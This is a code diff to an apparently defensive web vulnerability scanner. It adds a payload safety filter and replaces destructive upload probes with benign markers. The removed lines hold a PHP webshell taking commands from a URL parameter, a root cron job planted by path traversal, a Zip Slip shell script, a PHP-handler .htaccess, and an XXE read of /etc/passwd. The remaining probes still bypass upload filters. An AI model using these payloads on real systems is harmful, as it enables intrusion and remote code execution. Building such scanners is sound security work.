@@ -39,7 +39,9 @@ from .industry_patterns import (
     ACTIVE_PAYLOAD_EXTENSIONS,
     DETECTOR_EXTENSIONS,
     PARAM_NAME_RULE_EXTENSIONS,
+    UPLOAD_PROBE_EXTENSIONS,
 )
+from .payload_safety import PayloadSafetyFilter, is_dangerous_endpoint
 
 try:
     from .proof_validator import ProofValidator
@@ -3102,6 +3104,7 @@ class Fuzzer:
         "mass_assignment":       "high",
         "crypto_downgrade":      "high",
         "dangling_markup":       "medium",
+        "csv_formula_injection": "medium",
     }
 
     # Which vuln types to run per param type
@@ -3166,7 +3169,7 @@ class Fuzzer:
     # Each rule: (compiled_regex, [prioritized_vuln_types])
     # When a parameter name matches, these vuln types are tested FIRST,
     # followed by the remaining location-based types (deduplicated).
-    PARAM_NAME_RULES: list[tuple[re.Pattern, list[str]]] = [
+    PARAM_NAME_RULES: list[tuple[re.Pattern, list[str]]] = PARAM_NAME_RULE_EXTENSIONS + [
         # email, mail → header injection, email injection payloads
         (re.compile(r"(?i)(?:^|_|-)(e?mail|email_addr|from|to|cc|bcc|reply.?to)(?:$|_|-)"),
          ["header_injection", "crlf_injection", "ssrf", "ssti"]),
@@ -3222,7 +3225,7 @@ class Fuzzer:
         # xsl, xslt, transform, stylesheet → XSLT injection
         (re.compile(r"(?i)(?:^|_|-)(xsl|xslt|transform|stylesheet|xsl.?file|xsl.?template)(?:$|_|-)"),
          ["xslt_injection", "xxe", "lfi"]),
-    ] + PARAM_NAME_RULE_EXTENSIONS
+    ]
 
     @staticmethod
     def name_based_vuln_types(param_name: str) -> list[str]:
@@ -3253,6 +3256,8 @@ class Fuzzer:
         llm_provider: "Any | None" = None,
         scan_id: str = "",
         transform_mode: "Any | None" = None,
+        safety_policy: str = "standard",
+        allow_dangerous_endpoints: bool = False,
     ):
         self.scope          = scope
         self.session        = session
@@ -3265,6 +3270,8 @@ class Fuzzer:
         self.rate_limit     = rate_limit
         self.max_fuzz_time  = max_fuzz_time
         self.max_per_type   = max_per_type   # 0 = unlimited
+        self._payload_safety = PayloadSafetyFilter(safety_policy)
+        self.allow_dangerous_endpoints = allow_dangerous_endpoints
         self.on_finding     = on_finding
         self.stop_event     = stop_event or threading.Event()
         self.results:       list[FuzzResult] = []
@@ -3298,6 +3305,18 @@ class Fuzzer:
             "strategy_fail": {},      # strategy_name → count
         }
         self._sqli_candidates: list[str] = []
+
+    def _is_payload_safe(self, payload) -> bool:
+        """Return True when a payload can be sent under the active safety policy."""
+        if payload is None:
+            return True
+        if isinstance(payload, bytes):
+            text = payload.decode("utf-8", errors="ignore")
+        else:
+            text = str(payload)
+        if not text:
+            return True
+        return self._payload_safety.is_safe(text)
 
     @property
     def sqli_candidates(self) -> list[str]:
@@ -3428,6 +3447,18 @@ class Fuzzer:
         return recs
 
     def _fuzz_surface(self, surface):
+        if (
+            not self.allow_dangerous_endpoints
+            and is_dangerous_endpoint(surface.method, surface.url, surface.param)
+        ):
+            log.info(
+                "Skipping active fuzzing for sensitive endpoint: %s %s [%s]",
+                surface.method,
+                surface.url,
+                surface.param,
+            )
+            return
+
         location_types = self.PARAM_TYPE_MAP.get(surface.param_type, ["sqli_error", "xss_reflected"])
 
         # ── Context-aware: prioritize payloads by parameter name semantics ──
@@ -4764,6 +4795,66 @@ class Fuzzer:
         r"(?i)/(upload|file|attachment|media|asset|image|document|doc)[s/]"
     )
 
+    def _upload_probe_specs(self) -> list[tuple[str, bytes, str, str, bool]]:
+        """Build safety-filtered upload probes from built-ins and pattern packs."""
+        zip_buf = io.BytesIO()
+        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("../../dast-zipslip-marker.txt", "DAST_ZIPSLIP_MARKER\n")
+
+        probes: list[tuple[str, bytes, str, str, bool]] = [
+            ("shell.php", b"<?php echo 'exec:' . phpversion(); ?>", "image/jpeg",
+             "PHP extension uploaded with image/jpeg MIME type (MIME confusion)", True),
+            ("shell.php\x00.jpg", b"<?php echo 'null-byte-exec:' . phpversion(); ?>", "image/jpeg",
+             "Null-byte filename bypass: shell.php\\x00.jpg", True),
+            ("../../dast-upload-marker.txt", b"DAST_TRAVERSAL_MARKER\n", "text/plain",
+             "Path traversal in upload filename: ../../dast-upload-marker.txt", False),
+            (
+                "evil.svg",
+                (
+                    b'<?xml version="1.0" encoding="UTF-8"?>\n'
+                    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
+                    b'<svg xmlns="http://www.w3.org/2000/svg">'
+                    b'<text id="xxe-test-marker">&xxe;</text></svg>'
+                ),
+                "image/svg+xml",
+                "SVG upload with XXE payload targeting a low-sensitivity hostname file",
+                True,
+            ),
+            ("shell.phtml", b"<?php echo 'phtml-exec:' . phpversion(); ?>", "image/jpeg",
+             ".phtml extension bypass", True),
+            ("shell.php5", b"<?php echo 'php5-exec:' . phpversion(); ?>", "image/jpeg",
+             ".php5 extension bypass", True),
+            ("shell.phar", b"<?php echo 'phar-exec:' . phpversion(); ?>", "image/jpeg",
+             ".phar extension bypass", True),
+            ("zipslip.zip", zip_buf.getvalue(), "application/zip",
+             "Zip Slip: archive entry '../../dast-zipslip-marker.txt' traverses upload directory", False),
+            (".htaccess", b"# DAST_HTACCESS_MARKER\n", "text/plain",
+             ".htaccess control file upload accepted", False),
+            ("shell.jpg.php", b"<?php echo 'double-ext-exec:' . phpversion(); ?>", "image/jpeg",
+             "Double extension bypass: shell.jpg.php", True),
+            ("shell.PHP", b"<?php echo 'uppercase-ext-exec:' . phpversion(); ?>", "image/jpeg",
+             "Uppercase extension bypass: shell.PHP", True),
+        ]
+
+        for probe in UPLOAD_PROBE_EXTENSIONS:
+            try:
+                content = probe["content"]
+                content_bytes = content.encode("utf-8") if isinstance(content, str) else bytes(content)
+                probes.append((
+                    str(probe["filename"]),
+                    content_bytes,
+                    str(probe.get("content_type", "application/octet-stream")),
+                    str(probe.get("description", "External upload probe")),
+                    bool(probe.get("requires_execution", False)),
+                ))
+            except Exception:
+                continue
+
+        return [
+            probe for probe in probes
+            if self._is_payload_safe(probe[0]) and self._is_payload_safe(probe[1])
+        ]
+
     def _fuzz_upload_surfaces(self, surfaces: list):
         """
         Test file upload surfaces for dangerous bypass techniques:
@@ -4789,14 +4880,14 @@ class Fuzzer:
 
         zip_buf = io.BytesIO()
         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-            zf.writestr("../../evil.sh", "#!/bin/sh\nid > /tmp/zipslip_pwned\n")
+            zf.writestr("../../dast-zipslip-marker.txt", "DAST_ZIPSLIP_MARKER\n")
         _zip_content = zip_buf.getvalue()
 
         # Dangerous upload probes: (filename, content_bytes, content_type, vuln_desc, check_exec)
         _probes = [
             (
                 "shell.php",
-                b"<?php echo 'exec:' . phpversion(); system($_GET['cmd']); ?>",
+                b"<?php echo 'exec:' . phpversion(); ?>",
                 "image/jpeg",
                 "PHP webshell uploaded with image/jpeg MIME type (MIME confusion)",
                 True,
@@ -4809,22 +4900,22 @@ class Fuzzer:
                 True,
             ),
             (
-                "../../etc/cron.d/evil",
-                b"* * * * * root id > /tmp/pwned\n",
+                "../../dast-upload-marker.txt",
+                b"DAST_TRAVERSAL_MARKER\n",
                 "text/plain",
-                "Path traversal in upload filename: ../../etc/cron.d/evil",
+                "Path traversal in upload filename: ../../dast-upload-marker.txt",
                 False,  # success hint is enough for traversal
             ),
             (
                 "evil.svg",
                 (
                     b'<?xml version="1.0" encoding="UTF-8"?>\n'
-                    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+                    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
                     b'<svg xmlns="http://www.w3.org/2000/svg">'
                     b'<text id="xxe-test-marker">&xxe;</text></svg>'
                 ),
                 "image/svg+xml",
-                "SVG upload with XXE payload targeting /etc/passwd",
+                "SVG upload with XXE payload targeting a low-sensitivity hostname file",
                 True,
             ),
             (
@@ -4852,14 +4943,14 @@ class Fuzzer:
                 "zipslip.zip",
                 _zip_content,
                 "application/zip",
-                "Zip Slip: archive entry '../../evil.sh' traverses upload directory",
+                "Zip Slip: archive entry '../../dast-zipslip-marker.txt' traverses upload directory",
                 False,  # server accepting the archive is the signal
             ),
             (
                 ".htaccess",
-                b"AddType application/x-httpd-php .jpg\n",
+                b"# DAST_HTACCESS_MARKER\n",
                 "text/plain",
-                ".htaccess upload — adds PHP execution handler for .jpg (Apache config injection)",
+                ".htaccess control file upload accepted",
                 False,  # acceptance into web root is the vulnerability
             ),
             (
@@ -4877,6 +4968,8 @@ class Fuzzer:
                 True,
             ),
         ]
+
+        _probes = self._upload_probe_specs()
 
         seen_urls: set[str] = set()
         deadline = getattr(self, "_fuzz_deadline", float("inf"))
@@ -4898,6 +4991,17 @@ class Fuzzer:
 
             seen_urls.add(surface.url)
             field_name = surface.param or "file"
+            if (
+                not self.allow_dangerous_endpoints
+                and is_dangerous_endpoint(surface.method, surface.url, field_name)
+            ):
+                log.info(
+                    "Upload probing skipped for sensitive endpoint: %s %s [%s]",
+                    surface.method,
+                    surface.url,
+                    field_name,
+                )
+                continue
 
             for filename, content, content_type, vuln_desc, need_exec in _probes:
                 if self.stop_event.is_set() or time.time() > deadline:
@@ -5430,6 +5534,22 @@ class Fuzzer:
         return sum(samples[:-1]) / len(samples[:-1]) if len(samples) > 1 else samples[0]
 
     def _send_payload(self, surface, vuln_type: str, payload: str, baseline: Optional[float]):
+        if (
+            not self.allow_dangerous_endpoints
+            and is_dangerous_endpoint(surface.method, surface.url, surface.param)
+        ):
+            log.info(
+                "Payload skipped for sensitive endpoint: %s %s [%s]",
+                surface.method,
+                surface.url,
+                surface.param,
+            )
+            return
+
+        if not self._is_payload_safe(payload):
+            log.debug("Payload blocked by safety policy for %s: %r", vuln_type, payload[:120])
+            return
+
         # Apply HTTP transformation (WAF bypass encoding) if set
         _tm = getattr(self, "transform_mode", None)
         if _tm is not None:
@@ -5440,9 +5560,17 @@ class Fuzzer:
             except Exception:
                 pass
 
+        if not self._is_payload_safe(payload):
+            log.debug("Transformed payload blocked by safety policy for %s", vuln_type)
+            return
+
         url     = self._build_url(surface, payload)
         body    = self._build_body(surface, payload)
         headers = self._build_headers(surface, payload)
+
+        if not self._is_payload_safe(body or ""):
+            log.debug("Request body blocked by safety policy for %s", vuln_type)
+            return
 
         if not self.scope.in_scope(url):
             return
@@ -5525,6 +5653,8 @@ class Fuzzer:
                     waf_name=self._identified_waf,
                     preferred=self._successful_mutations[:3],
                 )
+                if not self._is_payload_safe(mutated):
+                    continue
                 strategy_idx = attempt % len(PayloadMutator.ALL_STRATEGIES)
                 strategy_name = PayloadMutator.ALL_STRATEGIES[strategy_idx]
                 mut_url = self._build_url(surface, mutated)
